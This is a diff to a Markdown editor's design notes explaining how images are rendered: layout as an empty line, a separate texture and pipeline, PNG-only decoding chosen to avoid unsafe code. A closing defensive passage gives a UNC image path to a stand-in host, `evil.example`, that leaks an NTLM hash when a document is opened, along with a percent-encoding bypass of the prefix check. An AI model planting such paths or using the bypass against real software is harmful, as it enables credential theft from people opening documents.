@@ -508,3 +508,48 @@ out of `AGENTS.md` when it passed 100 KB — see [the index](README.md) for why 
   it is a way of looking at a document for a moment rather than a preference, and an editor that
   opened in plain markup because you glanced at the source last week would be wrong.
   `plain_markup_does_not_persist` pins it, so changing it is a decision rather than an accident.
+- **A picture is the third rendering model, and the first with no glyphs (MDEDIT-146).** The other two
+  are conceal-and-style and MDEDIT-141's substitution; both still end in a run of text. An image ends
+  in a rectangle sampling a texture, and that is a different kind of thing.
+
+  **The chunk lays out as one empty line as tall as the picture.** No new layout type, no second
+  caret model and no second hit test — MDEDIT-81 already made "one `LayoutLine` with no glyphs" the
+  shape of an empty document, so `blocks::stack`, the scrollbar, the anchor and `hit` all handle it
+  without a branch. `Cached` gained a `picture` beside MDEDIT-126's `grid`, and its `None` says
+  "draw this as lines" the same way.
+
+  **The glyph atlas was not widened.** It is `R8Unorm` coverage; taking it to `Rgba8Unorm` would put
+  it from 4 MB to 16 MB against a baseline RSS this project already calls overrun, and would still
+  cap a picture at the 2048-texel page. A picture gets a texture of its own and a **second pipeline**
+  sharing the instance format, the bind-group layout and the globals — two entry points, not two
+  renderers. Pictures draw first in the same pass, because there is no depth buffer and no scissor
+  and the document's glyphs and then the chrome both have to be able to cover them.
+
+  **`Rgba8Unorm`, not `Rgba8UnormSrgb`**, because `Renderer::new` deliberately picks a non-sRGB
+  surface — so a picture's bytes reach the display the same way the theme's own colours do, and a
+  picture matches the chrome around it.
+
+  **The placement is data (`image::Drawn`), not a draw call.** CI cannot open a window, so this is the
+  only part of the feature that can be checked automatically at all: a test asserts the rectangle, and
+  whether the picture *looks* right stays a by-hand check on Windows.
+
+  **A paragraph is only a picture if it is nothing else**, and that is decided from the segments the
+  locator already emits rather than by re-parsing — `view.rs` refused a second link parser in the
+  renderer and this refuses one too. **Two traps sit there.** An image with no alt text has no text
+  event to subtract, so it arrives as *one* marker segment where `![alt](x.png)` arrives as two; and
+  adjacent markers of the same kind **coalesce**, so `![](a.png)![](b.png)` is also one segment and is
+  indistinguishable from a single image by shape. Matching the shapes drew the second picture and
+  swallowed the first, silently. Counting `![` is what separates them.
+
+  **PNG only, and `png` rather than `image`.** `png` 0.18 is `#![forbid(unsafe_code)]`, so the chunk
+  parser — the code that reads attacker-chosen bytes and decides how long a buffer is — has none.
+  Taking `image` for PNG and JPEG pulls `moxcms` and `pxfm` for colour management this editor never
+  uses, ~570 lines of `unsafe` between them, plus `zune-jpeg`'s 79. Nine crates and 95 `unsafe` lines
+  against twenty and ~750. JPEG is therefore its own decision on its own ticket, not a feature flag.
+
+  **Local files only, and the reason is worse than privacy.** `session::path` documents a UNC path
+  causing an outbound SMB connection with automatic NTLM authentication — a hash leaked with no
+  dialog and nothing on screen. A Markdown document is something you are *sent*, so unlike the
+  session file the attacker needs no write access to anything of yours: `![](\evil.example\a\x.png)`
+  in an attachment fires on open. `mdedit_image::resolve` refuses it, and **percent-decodes before the
+  prefix check** because `%5C%5C` is `\` and a check run first waves it through.
